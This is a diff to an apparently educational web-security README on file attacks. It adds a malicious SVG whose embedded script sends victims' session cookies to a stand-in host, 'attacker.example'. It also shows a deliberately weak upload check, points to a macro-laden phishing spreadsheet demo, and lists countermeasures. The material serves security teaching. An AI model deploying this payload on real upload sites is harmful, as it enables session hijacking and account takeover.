@@ -2,20 +2,80 @@
 
 ## File Attacks
 
-A file attack is an attack where threat actors use certain file types, usually a *.DOCX, *.XLSX, or *.PDF. Designed to entice users to open the document or follow a malicious link in a document. If the file in is embedded with malicious code, the code will be executed when the document is opened.
+A **file attack** is when a threat actor hides malicious code _inside a file_ and tricks a victim into opening or uploading it. The file looks normal (a spreadsheet, a picture, a PDF), but when it is opened, downloaded, or displayed by a website, the hidden code runs.
 
-See [index.html](index.html), which is set up as an example file attack approach that is sent in a convincing email that disarms the victims response to any script/macro warnings from excel. The [urgent_finance_review.xlsm](urgent_finance_review.xlsm) example spreadsheet only has a simple prompt box. However, it is only a few more lines of code to silently install key logging software with back to base reporting to the threat actor. In excel you can view the script by enabling the 'developer' ribbon and select 'Visual Basic' in the ribbon. School computers have security settings disabling VB scripts in excel so you may want to test it on your personal laptop to see it working.
+There are two main ways file attacks happen:
+
+1. **The user opens a booby-trapped file** (for example, a spreadsheet that runs a macro).
+2. **A website lets users upload files** and then serves those files back to other people without checking them properly.
+
+### Example 1: A malicious file sent in an email
+
+See [index.html](index.html), which is set up as an example file attack approach that is sent in a convincing email that disarms the victim's response to any script/macro warnings from Excel. The [urgent_finance_review.xlsm](urgent_finance_review.xlsm) example spreadsheet only has a simple prompt box. However, it is only a few more lines of code to silently install key-logging software that reports back to the threat actor. In Excel you can view the script by enabling the 'Developer' ribbon and selecting 'Visual Basic'. School computers have security settings that disable VB scripts in Excel, so you may want to test it on your personal laptop to see it working.
+
+### Example 2: A malicious SVG uploaded to a website
+
+This is the type of file attack most relevant to a web app like The Unsecure PWA. Imagine a website that lets users upload a profile picture. Pictures feel safe, so developers often forget to check them carefully.
+
+An **SVG** is an image format, but unlike a `.png` or `.jpg`, an SVG is actually a **text file written in XML** — and the browser is allowed to run `<script>` tags inside it. That means an attacker can create an "image" that is really a tiny program.
+
+Here is a malicious SVG. It looks like an image file (`profile.svg`), but it contains JavaScript:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <rect width="200" height="200" fill="lightblue" />
+  <text x="20" y="100">Just a harmless picture :)</text>
+  <script>
+    // This runs in the victim's browser when the SVG is opened directly.
+    // A real attacker would steal the victim's login cookie like this:
+    fetch("https://attacker.example/steal?c=" + document.cookie);
+  </script>
+</svg>
+```
+
+**What goes wrong, step by step:**
+
+1. The attacker uploads `profile.svg` as their profile picture.
+2. The website saves the file and later shows it to other users.
+3. When a victim's browser opens that SVG, the hidden `<script>` runs.
+4. The script grabs the victim's session cookie and sends it to the attacker, who can now log in as the victim.
+
+> [!NOTE]
+> This is closely related to [Cross Site Scripting - XSS](..\XSS\README.md). The SVG is just the _delivery method_ — the real damage is the script running in someone else's browser.
+
+### Why "just checking the file extension" is not enough
+
+A common beginner mistake is to "validate" an upload by only looking at the file name:
+
+```python
+# WEAK CHECK - do not rely on this alone!
+if filename.endswith(".svg") or filename.endswith(".png"):
+    save_file(uploaded_file)  # an SVG with a <script> still gets through
+```
+
+This does **not** stop the attack, because a malicious SVG genuinely _is_ an `.svg` file. An attacker can also rename files to sneak past simple checks. You need to check **what the file really is and what it contains**, not just its name.
 
 ## How to countermeasure file attacks
 
-- Countermeasure common vulnerabilities
-    - [Cross Frame Scripting - XFS](..\XFS\README.md)
-    - [Cross Site Request Forgery - CSRF](..\CSRF\README.md)
-    - [Cross Site Scripting - XSS](..\XSS\README.md)
-    - [Broken Authentication and Session Management](..\broken_authentication_and_session_management\README.md).
+- **Validate uploads properly** (not just the file extension):
+  - Check the real file type (the "magic bytes" / content), not only the name.
+  - Keep an **allow-list** of safe types you actually need (e.g. `.png`, `.jpg`) and reject everything else.
+  - Set a maximum file size.
+- **Never trust an uploaded file's name.** Rename files to a safe, random name when you save them.
+- **Store and serve uploads safely:**
+  - Save uploads _outside_ the web root, or serve them from a separate domain.
+  - Send images with `Content-Type: image/png` and `Content-Disposition: attachment` so the browser downloads them instead of running them.
+  - For SVGs specifically, _sanitise_ them to strip out `<script>` tags, or convert them to a safe format like PNG.
+- **Use a [Content Security Policy - CSP](..\content_security_policy\README.md)** to stop injected scripts from running.
+- Countermeasure related vulnerabilities:
+  - [Cross Frame Scripting - XFS](..\XFS\README.md)
+  - [Cross Site Request Forgery - CSRF](..\CSRF\README.md)
+  - [Cross Site Scripting - XSS](..\XSS\README.md)
+  - [Broken Authentication and Session Management](..\broken_authentication_and_session_management\README.md).
 - Implement [Two Factor Authentication - 2FA](..\two_factor_authentication\README.md).
-- End User education
-- White list firewalls
+- End-user education
+- Allow-list firewalls
 - Application control policies
 
 ## Side Channel Attacks
